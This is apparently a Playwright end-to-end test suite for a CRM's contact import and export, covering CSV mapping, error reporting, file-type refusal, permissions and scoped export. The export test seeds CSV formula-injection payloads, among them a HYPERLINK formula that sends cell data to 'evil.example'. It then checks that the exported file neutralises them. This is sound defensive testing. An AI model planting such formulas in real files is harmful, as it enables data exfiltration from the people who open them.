import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { expect, test, type Page } from '@playwright/test';

/**
 * Import and export, end to end (MVP_SPEC §M8, CLAUDE.md §10).
 *
 * The properties being checked cross every layer at once, which is why they are
 * tested in a browser: a file goes from the page **straight to object storage**
 * on a presigned URL (never through the API), is read by the worker, becomes
 * records, and comes back out as a download from storage again. Break any link —
 * the signature, the CORS rule, the worker, the permission check, the escaping —
 * and a flow here fails.
 *
 * Needs the API, the worker and MinIO running (see `.env.example`).
 */
const credentials = JSON.parse(
  readFileSync(join(import.meta.dirname, '.credentials.json'), 'utf8'),
) as { owner: string; rep: string; password: string };

async function signIn(page: Page, email: string): Promise<void> {
  await page.goto('/sign-in');
  await page.getByLabel('Email address').fill(email);
  await page.getByLabel('Password').fill(credentials.password);
  await page.getByRole('button', { name: 'Sign in' }).click();
  await page.waitForURL('**/dashboard');
  await page.goto('/contacts');
}

/** A tag no other run shares, so a test finds exactly its own records. */
const tag = (): string => `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;

const SLOW = { timeout: 90_000 };

async function chooseFile(page: Page, name: string, content: string | Buffer): Promise<void> {
  await page.goto('/import?object=contact');
  await expect(page.getByRole('heading', { name: 'Import records' })).toBeVisible();
  await page.getByLabel('File', { exact: true }).setInputFiles({
    name,
    mimeType: 'text/csv',
    buffer: Buffer.isBuffer(content) ? content : Buffer.from(content, 'utf8'),
  });
  await page.getByRole('button', { name: 'Upload and continue' }).click();
}

/** Upload, accept the suggested mapping, choose duplicate handling, and run. */
async function importCsv(
  page: Page,
  content: string,
  options: { mode?: 'skip' | 'update' | 'create'; name?: string } = {},
): Promise<void> {
  await chooseFile(page, options.name ?? 'people.csv', content);
  await expect(page.getByRole('heading', { name: 'Match columns to fields' })).toBeVisible(SLOW);

  const mode = options.mode ?? 'create';
  await page
    .getByLabel(
      {
        skip: 'Skip it and keep the existing record',
        update: 'Update it, changing only the fields in your file',
        create: 'Create a new record anyway',
      }[mode],
    )
    .check();
  await page.getByRole('button', { name: 'Start import' }).click();
  await expect(page.getByRole('heading', { name: 'Import finished' })).toBeVisible(SLOW);
}

test.describe('import', () => {
  test('uploads a CSV, maps it, imports it in the background and reports the counts', async ({
    page,
  }) => {
    await signIn(page, credentials.owner);
    const id = tag();

    await chooseFile(
      page,
      'contacts.csv',
      [
        'First name,Last name,Email',
        `Ada,Lovelace-${id},ada-${id}@e2e.example`,
        `Grace,Hopper-${id},grace-${id}@e2e.example`,
        `Alan,Turing-${id},alan-${id}@e2e.example`,
      ].join('\n'),
    );

    // The file is checked and the screen waits for it; nothing here blocks.
    await expect(page.getByRole('heading', { name: 'Match columns to fields' })).toBeVisible(SLOW);

    // The mapping was suggested from the headings, and says what it will do.
    await expect(page.getByLabel('Do not import: Last name')).toHaveValue('last_name');
    await expect(page.getByLabel('Do not import: Email')).toHaveValue('email');
    await expect(page.getByText('3 rows in this file')).toBeVisible();
    await expect(page.getByText('Every record you import is assigned to you.')).toBeVisible();

    // The target list is what this person may write. The workspace owner may reassign records, so
    // an Owner column is on offer (ADR-0067); a person who may not (an `own`-scope rep) is not
    // offered one, which the API's import tests pin.
    const options = await page
      .getByLabel('Do not import: First name')
      .locator('option')
      .allTextContents();
    expect(options).toContain('Last name *');
    expect(options.join('|')).toMatch(/Owner \(e-mail address/);
    await expect(page.getByText('Every record you import is assigned to you.')).toBeVisible();

    await page.getByLabel('Create a new record anyway').check();
    await page.getByRole('button', { name: 'Start import' }).click();

    await expect(page.getByRole('heading', { name: 'Import finished' })).toBeVisible(SLOW);
    await expect(page.getByText('3 created, 0 updated, 0 skipped, 0 failed.')).toBeVisible();

    // The records are real, and visible in the list, owned by the importer.
    await page.goto('/contacts');
    await page.getByLabel('Search contacts').fill(`Hopper-${id}`);
    await expect(page.getByRole('link', { name: `Hopper-${id}` })).toBeVisible(SLOW);
  });

  test('a row that cannot be imported is reported by its row number, and the rest import', async ({
    page,
  }) => {
    await signIn(page, credentials.owner);
    const id = tag();

    await importCsv(
      page,
      [
        'First name,Last name,Email',
        `Ok,One-${id},one-${id}@e2e.example`,
        `Bad,Two-${id},not-an-email`,
        `Ok,Three-${id},three-${id}@e2e.example`,
      ].join('\n'),
    );

    await expect(page.getByText('2 created, 0 updated, 0 skipped, 1 failed.')).toBeVisible();

    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: 'Download the error file' }).click(),
    ]);
    const body = readFileSync(await download.path(), 'utf8');
    const lines = body
      .replace(/^\uFEFF/, '')
      .trim()
      .split('\r\n');
    expect(lines[0]).toBe('Row,Field,Error,First name,Last name,Email');
    // Row 3 of *their* spreadsheet, the reason, and the original values.
    expect(lines[1]).toMatch(/^3,email,Email: /);
    expect(lines[1]).toContain(`Two-${id}`);
    expect(lines).toHaveLength(2);
  });

  test('a file that is not what its name says is refused, with a reason', async ({ page }) => {
    await signIn(page, credentials.owner);

    // A PDF named .csv: the type is decided by the bytes, never by the name.
    await chooseFile(page, 'customers.csv', Buffer.from('%PDF-1.7\n1 0 obj\n<<>>\nendobj\n'));

    await expect(page.getByText('We could not use that file')).toBeVisible(SLOW);
    await expect(page.getByText(/is a PDF/)).toBeVisible();
    await expect(page.getByRole('button', { name: 'Import another file' })).toBeVisible();
  });

  test('refuses an unsupported extension before anything is uploaded', async ({ page }) => {
    await signIn(page, credentials.owner);
    await page.goto('/import?object=contact');
    await page.getByLabel('File', { exact: true }).setInputFiles({
      name: 'customers.exe',
      mimeType: 'application/octet-stream',
      buffer: Buffer.from('MZ'),
    });
    // Not `getByRole('alert')`: Next's own route announcer has that role too.
    await expect(page.getByText('Choose a .csv or .xlsx file.')).toBeVisible();
  });

  test('update mode changes the record it matches and nothing else', async ({ page }) => {
    await signIn(page, credentials.owner);
    const id = tag();

    await importCsv(
      page,
      ['First name,Last name,Email', `Kay,Before-${id},kay-${id}@e2e.example`].join('\n'),
    );
    await importCsv(
      page,
      ['First name,Last name,Email', `Kay,After-${id},kay-${id}@e2e.example`].join('\n'),
      { mode: 'update' },
    );
    await expect(page.getByText('0 created, 1 updated, 0 skipped, 0 failed.')).toBeVisible();

    await page.goto('/contacts');
    await page.getByLabel('Search contacts').fill(`kay-${id}`);
    await expect(page.getByRole('link', { name: `After-${id}` })).toBeVisible(SLOW);
    await expect(page.getByRole('link', { name: `Before-${id}` })).toHaveCount(0);
  });

  test('a person without the import permission is told so', async ({ page }) => {
    await signIn(page, credentials.rep);
    await chooseFile(page, 'mine.csv', 'First name,Last name,Email\nA,B,c@e2e.example\n');
    await expect(
      page.getByText('Ask an administrator to grant you permission to import.'),
    ).toBeVisible();
  });
});

test.describe('export', () => {
  test('exports the list as shown, and a spreadsheet formula cannot survive it', async ({
    page,
  }) => {
    await signIn(page, credentials.owner);
    const id = tag();

    // Data arrives by import — which is how an attacker gets a string of their
    // choosing into a tenant — and must leave **inert**.
    await importCsv(
      page,
      [
        'First name,Last name,Email',
        `Eve,"=HYPERLINK(""http://evil.example/?""&A1,""x"")-${id}",eve-${id}@e2e.example`,
        `Mal,+1+1-${id},mal-${id}@e2e.example`,
        `Zed,@SUM(1)-${id},zed-${id}@e2e.example`,
        `Neg,-2+3-${id},neg-${id}@e2e.example`,
        `Fine,Plain-${id},fine-${id}@e2e.example`,
      ].join('\n'),
    );

    await page.goto('/contacts');
    await page.getByLabel('Search contacts').fill(`-${id}`);
    await expect(page.getByText(/contacts loaded/)).toBeVisible(SLOW);

    await page.getByRole('button', { name: 'Export' }).click();
    const dialog = page.getByRole('dialog', { name: 'Export contacts' });
    await expect(dialog).toBeVisible();
    await dialog.getByRole('button', { name: 'Start export' }).click();
    await expect(dialog.getByText(/Your file is ready \(5 rows\)/)).toBeVisible(SLOW);

    const [download] = await Promise.all([
      page.waitForEvent('download'),
      dialog.getByRole('button', { name: 'Download' }).click(),
    ]);
    const raw = readFileSync(await download.path(), 'utf8');

    // Excel needs the byte-order mark to read UTF-8 correctly.
    expect(raw.startsWith('\uFEFF')).toBe(true);
    expect(raw).toContain('Last name');

    // Every payload is there, apostrophe-prefixed...
    for (const payload of ['=HYPERLINK', '+1+1', '@SUM(1)', '-2+3']) {
      expect(raw).toContain(`'${payload}`);
    }
    // ...and no cell anywhere begins with a formula character.
    const cells = raw
      .replace(/^\uFEFF/, '')
      .split('\r\n')
      .flatMap((line) => line.split(','));
    for (const cell of cells) {
      // Looks past leading whitespace, as Excel does.
      expect(cell.replace(/^"/, '')).not.toMatch(/^[\s\u200B-\u200D\u2060\uFEFF]*[=+\-@]/u);
    }
    expect(raw).toContain(`Plain-${id}`);
  });

  test('exports an .xlsx too', async ({ page }) => {
    await signIn(page, credentials.owner);
    await page.getByRole('button', { name: 'Export' }).click();
    const dialog = page.getByRole('dialog', { name: 'Export contacts' });
    await dialog.getByLabel('Format').selectOption('xlsx');
    await dialog.getByRole('button', { name: 'Start export' }).click();
    await expect(dialog.getByText(/Your file is ready/)).toBeVisible(SLOW);

    const [download] = await Promise.all([
      page.waitForEvent('download'),
      dialog.getByRole('button', { name: 'Download' }).click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/\.xlsx$/);
    const bytes = readFileSync(await download.path());
    // A zip: the bytes say "workbook", not just the name.
    expect(bytes.subarray(0, 4).toString('hex')).toBe('504b0304');
  });

  test('a sales rep exports only their own records', async ({ page }) => {
    await signIn(page, credentials.rep);
    await expect(page.getByText(/contacts loaded/)).toBeVisible();

    await page.getByRole('button', { name: 'Export' }).click();
    const dialog = page.getByRole('dialog', { name: 'Export contacts' });
    await dialog.getByRole('button', { name: 'Start export' }).click();
    await expect(dialog.getByText(/Your file is ready/)).toBeVisible(SLOW);

    const [download] = await Promise.all([
      page.waitForEvent('download'),
      dialog.getByRole('button', { name: 'Download' }).click(),
    ]);
    const raw = readFileSync(await download.path(), 'utf8');
    expect(raw).toContain('Khan');
    expect(raw).toContain('DSouza');
    // Owned by the other user: `own` scope never put them in the file.
    expect(raw).not.toContain('Sharma');
    expect(raw).not.toContain('Reddy');
  });
});
